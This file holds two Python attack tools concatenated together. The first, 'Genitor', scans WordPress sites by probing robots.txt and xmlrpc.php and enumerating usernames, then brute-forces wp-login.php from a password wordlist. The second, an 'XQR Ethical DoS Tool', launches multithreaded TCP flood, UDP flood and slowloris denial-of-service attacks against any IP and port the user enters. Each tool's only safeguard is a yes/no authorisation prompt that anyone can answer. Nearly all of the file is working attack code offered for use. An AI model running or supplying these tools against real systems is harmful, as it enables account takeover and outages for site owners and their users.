import requests
import time
import sys

def show_banner():
    banner = r"""
   ____             _ _           
  / ___| ___   ___ | (_) ___ _ __ 
 | |  _ / _ \ / _ \| | |/ _ \ '__|
 | |_| | (_) | (_) | | |  __/ |   
  \____|\___/ \___/|_|_|\___|_|   

       [ Genitor v0.4 ]
 WordPress Recon & Brute Tool
     by Aditya Rawat (KB-ADRA)
"""
    print(banner)
    time.sleep(0.5)
print("are you authorized")

print("do you have permission for testing the website")

response = input("the author is not responsible for your any move,unauthorized access is a cyber crime according to-Section 43 of the Information Technology Act, 2000, addresses penalties for unauthorized access, including accessing, downloading, or introducing a virus into a computer system without permission,did you accept and continue (yes/no): ")

if response.lower() == "yes":

                     print("access granted, and you are responsible for your all moves")

else:
     print("you are a cyber criminal")
     sys.exit()

def scan_robots_txt(domain):
    print(f"\n[+] Scanning robots.txt on {domain}...\n")
    if not domain.startswith("http"):
        domain = "http://" + domain

    try:
        r = requests.get(f"{domain}/robots.txt", timeout=5)
        if r.status_code != 200:
            print(f"[!] Failed to fetch robots.txt (status {r.status_code})")
            return
        
        lines = r.text.splitlines()
        disallowed = [line.split(":")[1].strip() for line in lines if line.lower().startswith("disallow:")]

        if not disallowed:
            print("[!] No disallowed entries found.")
            return

        print("[*] Disallowed paths found:\n")
        for path in disallowed:
            full_url = domain + path
            try:
                res = requests.get(full_url, timeout=5)
                print(f"[+] {path} — {res.status_code} {res.reason}")
            except requests.RequestException:
                print(f"[!] {path} — Failed to connect")

    except requests.RequestException:
        print("[!] Connection failed. Check your domain or network.")

def scan_xmlrpc(domain):
    print(f"\n[+] Scanning {domain}/xmlrpc.php ...")
    if not domain.startswith("http"):
        domain = "http://" + domain

    try:
        url = f"{domain}/xmlrpc.php"
        res = requests.get(url, timeout=5)
        if res.status_code == 200:
            print(f"[!] xmlrpc.php FOUND — {res.status_code} OK")
            if "XML-RPC server accepts POST requests only" in res.text:
                print("[!] Looks like a real WordPress XML-RPC endpoint")
        elif res.status_code == 403:
            print(f"[+] xmlrpc.php exists but access is forbidden — 403")
        else:
            print(f"[+] xmlrpc.php returned: {res.status_code} {res.reason}")
    except requests.RequestException:
        print("[!] Failed to connect to target")

def wp_user_enum(domain):
    print(f"\n[+] Trying to enumerate WordPress usernames via /wp-json/wp/v2/users")
    if not domain.startswith("http"):
        domain = "http://" + domain

    try:
        url = f"{domain}/wp-json/wp/v2/users"
        res = requests.get(url, timeout=5)
        if res.status_code == 200:
            users = res.json()
            if isinstance(users, list) and users:
                print("[*] Usernames found:")
                for user in users:
                    print(f"    - ID {user.get('id')} | Username: {user.get('slug')} | Name: {user.get('name')}")
            else:
                print("[!] No users found or response is empty.")
        elif res.status_code == 403:
            print("[!] Forbidden - endpoint exists but access denied.")
        else:
            print(f"[!] Endpoint returned: {res.status_code} {res.reason}")
    except requests.RequestException:
        print("[!] Failed to connect or parse response.")

def wp_brute_force(domain):
    print("\n[+] WordPress Brute Force Starting...\n")
    if not domain.startswith("http"):
        domain = "http://" + domain

    login_url = f"{domain}/wp-login.php"
    username = input("Enter username to brute-force: ").strip()
    wordlist_path = input("Enter path to password wordlist (e.g. wordlist.txt): ").strip()

    try:
        with open(wordlist_path, "r") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("[!] Wordlist file not found.")
        return

    for pwd in passwords:
        print(f"[*] Trying: {pwd}")
        data = {
            "log": username,
            "pwd": pwd,
            "wp-submit": "Log In",
            "redirect_to": f"{domain}/wp-admin/",
            "testcookie": "1"
        }
        try:
            res = requests.post(login_url, data=data, timeout=10, allow_redirects=False)

            if "location" in res.headers and "/wp-admin/" in res.headers["location"]:
                print(f"[+] SUCCESS: Password Found! => {pwd}")
                return
            elif "incorrect" in res.text.lower():
                continue
        except requests.RequestException:
            print("[!] Error connecting. Skipping...")

    print("[!] Done. Password not found in wordlist.")

def main():
    show_banner()
    domain = input("Enter target domain (e.g. example.com): ").strip()

    while True:
        print("""
[1] Robots.txt Scanner
[2] XML-RPC Scanner
[3] WordPress Username Finder
[4] WordPress Brute Force
[5] Exit
        """)
        choice = input("Choose an option: ").strip()

        if choice == "1":
            scan_robots_txt(domain)
        elif choice == "2":
            scan_xmlrpc(domain)
        elif choice == "3":
            wp_user_enum(domain)
        elif choice == "4":
            wp_brute_force(domain)
        elif choice == "5":
            print("Goodbye!")
            break
        else:
            print("Invalid option.")

if __name__ == "__main__":
    main()
import socket
import threading
import random
import time

def tcp_flood(target_ip, target_port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.sendto(b"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n", (target_ip, target_port))
            s.close()
        except:
            pass

def udp_flood(target_ip, target_port):
    data = random._urandom(1024)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(data, (target_ip, target_port))
        except:
            pass

def slowloris(target_ip, target_port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode('utf-8'))
            s.send(f"Host: {target_ip}\r\n".encode('utf-8'))
            for i in range(10):
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode('utf-8'))
                time.sleep(1.5)
        except:
            pass

def start_attack(target_ip, target_port, method, threads=100):
    print(f"[+] Starting {method.upper()} attack on {target_ip}:{target_port} with {threads} threads...")
    attack_function = {
        "tcp": tcp_flood,
        "udp": udp_flood,
        "slowloris": slowloris
    }.get(method.lower())

    if not attack_function:
        print("[-] Invalid method selected.")
        return

    for _ in range(threads):
        thread = threading.Thread(target=attack_function, args=(target_ip, target_port))
        thread.daemon = True
        thread.start()

# Entry point for XQR
def run_dos_module():
    print("=== XQR Ethical DoS Tool ===")
    print("Methods: tcp | udp | slowloris")
    
    print("NOTE: Use this tool only on systems you are authorized to test.")
    confirm = input("Do you have permission to test this target? (yes/no): ")
    if confirm.lower() != "yes":
        print("Aborting. Unauthorized testing is illegal.")
        return

    target_ip = input("Target IP: ")
    target_port = int(input("Target Port: "))
    method = input("Attack Method (tcp/udp/slowloris): ")
    threads = int(input("Number of Threads: "))

    start_attack(target_ip, target_port, method, threads)
